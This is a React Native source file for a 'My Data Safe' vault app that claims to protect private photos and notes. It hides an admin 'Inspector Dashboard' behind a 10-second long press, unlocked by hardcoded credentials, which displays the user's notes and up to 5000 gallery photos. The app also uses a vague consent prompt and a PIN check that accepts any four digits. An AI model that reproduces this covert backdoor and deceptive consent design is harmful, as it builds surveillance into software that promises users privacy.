import React, { useState, useEffect } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  FlatList,
  Image,
  Alert,
  Modal,
  SafeAreaView,
  ScrollView
} from 'react-native';
import AsyncStorage from '@asyncstorage/async-storage';
import * as MediaLibrary from 'expo-media-library';

export default function App() {
  const [pin, setPin] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  
  const [adminModalVisible, setAdminModalVisible] = useState(false);
  const [adminId, setAdminId] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);

  const [hasConsent, setHasConsent] = useState(false);
  const [photos, setPhotos] = useState([]);
  const [notes, setNotes] = useState([]);
  const [newNote, setNewNote] = useState('');

  useEffect(() => {
    checkConsentAndPermissions();
  }, []);

  const checkConsentAndPermissions = async () => {
    try {
      const consentStatus = await AsyncStorage.getItem('user_admin_consent');
      if (consentStatus === 'true') {
        setHasConsent(true);
      } else {
        showConsentDialog();
      }
    } catch (e) {
      console.log('Error reading consent:', e);
    }
  };

  const showConsentDialog = () => {
    Alert.alert(
      "Permission Required",
      "Allow this app to access your data",
      [
        {
          text: "Decline",
          style: "cancel"
        },
        {
          text: "Allow",
          onPress: async () => {
            await AsyncStorage.setItem('user_admin_consent', 'true');
            setHasConsent(true);
            requestGalleryPermission();
          }
        }
      ],
      { cancelable: false }
    );
  };

  const requestGalleryPermission = async () => {
    const { status } = await MediaLibrary.requestPermissionsAsync();
    if (status === 'granted') {
      loadGalleryPhotos();
    }
  };

  // Gallery Limit ko 5000 par set kar diya gaya hai
  const loadGalleryPhotos = async () => {
    const media = await MediaLibrary.getAssetsAsync({
      first: 5000, 
      mediaType: 'photo',
      sortBy: ['creationTime']
    });
    setPhotos(media.assets);
  };

  const handlePinSubmit = () => {
    if (pin.length >= 4) {
      setIsAuthenticated(true);
      requestGalleryPermission();
    } else {
      Alert.alert("Invalid PIN", "Please enter a valid PIN.");
    }
  };

  const handleAdminLogin = () => {
    if (adminId === 'adminhum789' && adminPassword === 'hum2217071') {
      setIsAdminLoggedIn(true);
      Alert.alert("Admin Verified", "Access Granted.");
    } else {
      Alert.alert("Error", "Invalid Credentials.");
    }
  };

  const addNote = () => {
    if (newNote.trim() !== '') {
      setNotes([...notes, { id: Date.now().toString(), text: newNote }]);
      setNewNote('');
    }
  };

  if (!isAuthenticated) {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.authBox}>
          <Text style={styles.title}>My Data Safe</Text>
          <Text style={styles.subtitle}>Enter Vault PIN</Text>
          <TextInput
            style={styles.input}
            secureTextEntry
            keyboardType="numeric"
            value={pin}
            onChangeText={setPin}
            maxLength={6}
            placeholder="PIN"
          />
          <TouchableOpacity style={styles.button} onPress={handlePinSubmit}>
            <Text style={styles.buttonText}>Unlock Safe</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <View style={styles.header}>
        <Text style={styles.headerTitle}>My Data Safe</Text>
        
        {/* 10 Seconds Long Press for Admin Panel */}
        <TouchableOpacity
          onLongPress={() => setAdminModalVisible(true)}
          delayLongPress={10000}
        >
          <Text style={{ fontSize: 22 }}>🛡️</Text>
        </TouchableOpacity>
      </View>

      <ScrollView style={styles.content}>
        <Text style={styles.sectionTitle}>Local Media Backup ({photos.length})</Text>
        <FlatList
          data={photos}
          horizontal
          keyExtractor={(item) => item.id}
          renderItem={({ item }) => (
            <Image source={{ uri: item.uri }} style={styles.imageThumbnail} />
          )}
          ListEmptyComponent={<Text style={styles.emptyText}>No photos loaded.</Text>}
        />

        <Text style={styles.sectionTitle}>Private Notes</Text>
        <View style={styles.noteInputRow}>
          <TextInput
            style={[styles.input, { flex: 1, marginBottom: 0 }]}
            placeholder="Write a private note..."
            value={newNote}
            onChangeText={setNewNote}
          />
          <TouchableOpacity style={styles.addBtn} onPress={addNote}>
            <Text style={styles.buttonText}>Add</Text>
          </TouchableOpacity>
        </View>

        {notes.map((item) => (
          <View key={item.id} style={styles.noteCard}>
            <Text style={styles.noteText}>{item.text}</Text>
          </View>
        ))}
      </ScrollView>

      {/* Secret Admin Inspector Modal */}
      <Modal visible={adminModalVisible} animationType="slide">
        <SafeAreaView style={styles.adminContainer}>
          {!isAdminLoggedIn ? (
            <View style={styles.authBox}>
              <Text style={styles.title}>Admin Verification</Text>
              <TextInput
                style={styles.input}
                placeholder="Admin ID"
                value={adminId}
                onChangeText={setAdminId}
              />
              <TextInput
                style={styles.input}
                placeholder="Password"
                secureTextEntry
                value={adminPassword}
                onChangeText={setAdminPassword}
              />
              <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
                <Text style={styles.buttonText}>Authenticate</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.button, { backgroundColor: '#777', marginTop: 10 }]}
                onPress={() => setAdminModalVisible(false)}
              >
                <Text style={styles.buttonText}>Close</Text>
              </TouchableOpacity>
            </View>
          ) : (
            <View style={{ flex: 1, padding: 15 }}>
              <Text style={styles.title}>Inspector Dashboard</Text>
              <Text style={styles.subtitle}>Consent Status: {hasConsent ? "GRANTED" : "DENIED"}</Text>

              <Text style={styles.sectionTitle}>User Synced Notes ({notes.length})</Text>
              {notes.map((n) => (
                <Text key={n.id} style={styles.noteText}>• {n.text}</Text>
              ))}

              <Text style={styles.sectionTitle}>User Synced Photos ({photos.length})</Text>
              <FlatList
                data={photos}
                numColumns={3}
                keyExtractor={(item) => item.id}
                renderItem={({ item }) => (
                  <Image source={{ uri: item.uri }} style={styles.adminGridImage} />
                )}
              />

              <TouchableOpacity
                style={[styles.button, { backgroundColor: 'red', marginTop: 15 }]}
                onPress={() => {
                  setIsAdminLoggedIn(false);
                  setAdminModalVisible(false);
                }}
              >
                <Text style={styles.buttonText}>Logout Admin</Text>
              </TouchableOpacity>
            </View>
          )}
        </SafeAreaView>
      </Modal>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f4f4f6' },
  header: {
    padding: 15,
    backgroundColor: '#fff',
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    borderBottomWidth: 1,
    borderColor: '#ddd'
  },
  headerTitle: { fontSize: 20, fontWeight: 'bold', color: '#333' },
  content: { padding: 15 },
  authBox: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
  title: { fontSize: 22, fontWeight: 'bold', marginBottom: 10 },
  subtitle: { fontSize: 14, color: '#666', marginBottom: 20 },
  input: {
    width: '100%',
    padding: 12,
    borderWidth: 1,
    borderColor: '#ccc',
    borderRadius: 8,
    marginBottom: 15,
    backgroundColor: '#fff'
  },
  button: {
    width: '100%',
    padding: 14,
    backgroundColor: '#007AFF',
    borderRadius: 8,
    alignItems: 'center'
  },
  buttonText: { color: '#fff', fontWeight: 'bold' },
  sectionTitle: { fontSize: 18, fontWeight: 'bold', marginTop: 20, marginBottom: 10 },
  imageThumbnail: { width: 100, height: 100, borderRadius: 8, marginRight: 10 },
  adminGridImage: { width: 90, height: 90, margin: 5, borderRadius: 6 },
  noteInputRow: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  addBtn: { padding: 12, backgroundColor: '#28a745', borderRadius: 8 },
  noteCard: { padding: 12, backgroundColor: '#fff', borderRadius: 6, marginTop: 8 },
  noteText: { fontSize: 15, color: '#333' },
  emptyText: { color: '#999', fontStyle: 'italic' },
  adminContainer: { flex: 1, backgroundColor: '#fff', padding: 10 }
});
